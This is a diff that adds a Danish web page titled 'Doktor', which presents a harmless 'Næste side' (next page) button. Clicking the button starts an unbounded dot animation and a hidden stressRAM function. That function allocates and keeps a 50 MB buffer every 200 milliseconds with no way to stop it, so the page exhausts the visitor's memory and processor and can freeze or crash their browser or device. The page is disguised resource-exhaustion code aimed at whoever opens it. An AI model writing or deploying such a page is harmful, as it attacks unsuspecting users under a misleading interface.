@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Doktor</title>
+  <style>
+    body{
+      margin:0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, #6a0dad, #ff7f50);
+      color:#fff;
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      gap:14px;
+      padding:24px;
+      box-sizing:border-box;
+      text-align:center;
+    }
+    .card{
+      width:min(900px, 100%);
+      background: rgba(0,0,0,.25);
+      border: 1px solid rgba(255,255,255,.18);
+      border-radius:16px;
+      padding:16px;
+      backdrop-filter: blur(6px);
+      box-shadow: 0 10px 30px rgba(0,0,0,.2);
+    }
+    button{
+      background:#fff;
+      color:#6a0dad;
+      border:none;
+      padding:12px 18px;
+      font-size:16px;
+      border-radius:12px;
+      cursor:pointer;
+      box-shadow:0 5px 15px rgba(0,0,0,.2);
+      transition: transform .12s ease;
+    }
+    button:active{transform: scale(.98)}
+    #arena{
+        display:none;
+        width:min(1100px, 100%);
+        height: min(65vh, 680px);
+        background: rgba(0,0,0,.18);
+        border: 1px solid rgba(255,255,255,.18);
+        border-radius:16px;
+        overflow:hidden;
+        position:relative;
+    }
+    .dot{
+      position:absolute;
+      border-radius:999px;
+      pointer-events:none;
+      mix-blend-mode: screen;
+      will-change: transform;
+      opacity:.9;
+    }
+    .hint{
+      opacity:.9;
+      font-size:13px;
+      margin-top:10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Min side</h1>
+    <p>Tryk for at komme videre til næste side</p>
+    <button id="startBtn">Næste side</button>
+  </div>
+
+  <div id="arena"></div>
+
+  <script>
+    const arena = document.getElementById("arena");
+    const startBtn = document.getElementById("startBtn");
+
+    let running = false;
+    let rafId = null;
+    let dots = [];
+    let lastSpawn = 0;
+
+    const I = 5000;
+    const MAX = 40000000;
+
+    function rand(min, max){ return Math.random() * (max - min) + min; }
+
+    function spawnDot(){
+      const d = document.createElement("div");
+      d.className = "dot";
+
+      const size = rand(10, 40);
+      d.style.width = size + "px";
+      d.style.height = size + "px";
+
+      const rect = arena.getBoundingClientRect();
+      const x = rand(0, Math.max(1, rect.width - size));
+      const y = rand(0, Math.max(1, rect.height - size));
+
+      const hue = Math.floor(rand(0, 360));
+      d.style.background = `hsl(${hue} 95% 65%)`;
+
+      d.dataset.x = x;
+      d.dataset.y = y;
+      d.dataset.vx = rand(-2.2, 2.2);
+      d.dataset.vy = rand(-2.2, 2.2);
+
+      d.style.transform = `translate(${x}px, ${y}px)`;
+      arena.appendChild(d);
+      dots.push(d);
+    }
+
+    function trimDots(){
+      while (dots.length > MAX){
+        const old = dots.shift();
+        if (old) old.remove();
+      }
+    }
+
+    function tick(ts){
+      if (!running) return;
+
+      const rect = arena.getBoundingClientRect();
+      const spawnEveryMs = Math.max(25, 120 - I * 10);
+      const spawnBurst = Math.min(8, 1 + Math.floor(I / 2));
+
+      if (!lastSpawn) lastSpawn = ts;
+      if (ts - lastSpawn >= spawnEveryMs){
+        lastSpawn = ts;
+        for (let i=0; i<spawnBurst; i++){
+          if (dots.length < MAX) spawnDot();
+        }
+      }
+
+      for (const d of dots){
+        let x = Number(d.dataset.x);
+        let y = Number(d.dataset.y);
+        let vx = Number(d.dataset.vx);
+        let vy = Number(d.dataset.vy);
+
+        vx += rand(-0.12, 0.12) * (I/6);
+        vy += rand(-0.12, 0.12) * (I/6);
+
+        const cap = 4.5 + I * 0.2;
+        vx = Math.max(-cap, Math.min(cap, vx));
+        vy = Math.max(-cap, Math.min(cap, vy));
+
+        x += vx; y += vy;
+
+        const w = d.offsetWidth, h = d.offsetHeight;
+
+        if (x <= 0 || x >= rect.width - w) vx *= -1;
+        if (y <= 0 || y >= rect.height - h) vy *= -1;
+
+        x = Math.max(0, Math.min(rect.width - w, x));
+        y = Math.max(0, Math.min(rect.height - h, y));
+
+        d.dataset.x = x; d.dataset.y = y;
+        d.dataset.vx = vx; d.dataset.vy = vy;
+
+        d.style.transform = `translate(${x}px, ${y}px)`;
+      }
+
+      trimDots();
+      rafId = requestAnimationFrame(tick);
+    }
+
+    let memory = [];
+
+    function stressRAM() {
+
+    setInterval(() => {
+
+        let buffer = new ArrayBuffer(50 * 1024 * 1024);
+
+        memory.push(buffer);
+
+        console.log("RAM chunks:", memory.length);
+
+    }, 200);
+
+    }
+
+    function start(){
+      if (running) return;
+      arena.style.display = "block";
+      running = true;
+      startBtn.disabled = true;
+      stressRAM();
+      rafId = requestAnimationFrame(tick);
+    }
+
+    function stop(){
+      running = false;
+      startBtn.disabled = false;
+      if (rafId) cancelAnimationFrame(rafId);
+      rafId = null;
+    }
+
+    startBtn.addEventListener("click", start);
+
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "Escape") stop();
+    });
+  </script>
+</body>
+</html>
